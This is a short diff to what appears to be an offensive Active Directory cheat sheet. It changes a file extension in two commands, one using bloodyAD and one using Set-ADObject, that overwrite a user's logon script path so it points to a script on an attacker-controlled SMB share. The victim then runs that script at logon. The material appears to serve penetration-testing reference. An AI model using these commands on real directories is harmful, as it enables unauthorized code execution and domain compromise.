@@ -105,11 +105,11 @@ ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtr
 * WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : 
 	* Windows/Linux:
 		```ps1
-		bloodyAD --host 10.0.0.5 -d example.lab -u attacker -p 'Password123*' set object delegate scriptpath -v '\\10.0.0.5\totallyLegitScript.ps1'
+		bloodyAD --host 10.0.0.5 -d example.lab -u attacker -p 'Password123*' set object delegate scriptpath -v '\\10.0.0.5\totallyLegitScript.bat'
 		```
 	* Windows only:
 		```ps1
-		Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
+		Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.bat"
 		```
 
 ### Group
